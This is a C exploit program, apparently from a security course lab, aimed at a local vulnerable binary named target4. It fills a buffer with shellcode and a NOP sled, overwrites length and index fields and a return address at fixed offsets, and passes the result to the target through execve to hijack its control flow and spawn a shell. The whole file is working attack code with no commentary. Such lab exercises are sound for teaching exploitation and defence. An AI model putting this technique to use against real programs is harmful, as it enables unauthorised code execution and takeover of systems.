#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  char exploit[200];
  bzero(exploit, 200);
  strcpy(exploit, shellcode);
  memset(&exploit[45], NOP, 155);

  int target_len = 0x1fffffff;
	memcpy(&exploit[168], &(target_len), sizeof(target_len));
  
  int target_i = 0x1ffffff0;
 	memcpy(&exploit[172], &(target_i), sizeof(target_i)); 

  char* retaddr = (char*)0x2021FDF0;
	memcpy(&exploit[184], &(retaddr), sizeof(retaddr));

  args[0] = TARGET;
  args[1] = exploit;
  args[2] = NULL;
  env[0] = NULL;


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
